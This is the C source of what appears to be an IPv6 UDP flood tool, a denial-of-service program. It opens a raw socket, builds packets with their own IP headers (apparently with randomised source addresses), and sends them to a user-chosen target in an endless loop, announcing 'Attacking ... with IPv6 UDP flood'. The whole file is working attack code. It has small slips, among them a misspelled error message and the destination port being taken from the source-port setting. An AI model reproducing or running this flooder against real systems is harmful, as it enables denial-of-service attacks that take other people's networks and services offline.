#include <netinet/ip.h>
#include <stdio.h>
#include <errno.h>
#include <sys/socket.h>
#include <time.h>
#include "options.h"

void flood(struct packet_settings *settings)
{
	int enable = 1;
	// Create a raw network socket
	int sock = socket(AF_INET6, SOCK_RAW, IPPROTO_RAW);
	if (sock == -1)
		crash("Failed to open a socket!");

	// Set Socket option to let us create IP header ourselves:
	if(setsockopt(sock, IPPROTO_IPV6, IPV6_HDRINCL, &enable, sizeof(enable)) == -1)
		crash("Failed to set socket options!");

	// Provide destination information:
	struct sockaddr_in6 dest_info; // Store target address for the raw socket
	dest_info.sin6_family = AF_INET6;
	dest_info.sin6_port = htons(settings->source_port);
	if (inet_pton(AF_INET6, settings->target_ip_address, &dest_info.sin6_addr) != 1)
		crash("Invaliid IP!");

	// 'packet' is the buffer to store the packet in.
	// PACKET_SIZE is 48 bytes - the maximum packet size in our program (IPv6 header size (40) + UDP header size (8))
	char packet[PACKET_SIZE];

	printf("Attacking %s on port %d with IPv6 UDP flood, Press Ctrl+C to stop...\n", settings->target_ip_address, settings->target_port);
	// We enter an infinite loop to flood the target:
	while (1)
	{
		memset(packet, 0, PACKET_SIZE); // Init packet with zeros every time to create a new packet

		create_packet(packet, settings); // Create a new packet and store it in 'packet'

		sendto(sock, packet, UDP_PACKET_LENGTH, 0, (struct sockaddr *)&dest_info, sizeof(dest_info)); // Send out the packet
	}

	close(sock);
}

int main(int argc, char *argv[])
{
	// Initialize random seed to current time so that IP addresses will be different each time the program is running.
	srand(time(NULL));

	// 'packet_settings' is the struct we keep our packet settings in.
	// For more information, check out 'packets.h'
	struct packet_settings settings;
	memset(&settings, 0, sizeof(struct packet_settings));

	// Initialize 'settings' and analyze/set user input:
	memset(&settings, 0, sizeof(struct packet_settings));
	set_options(argc, argv, &settings);

	//Begin flooding process:
	flood(&settings);

	return 0;
}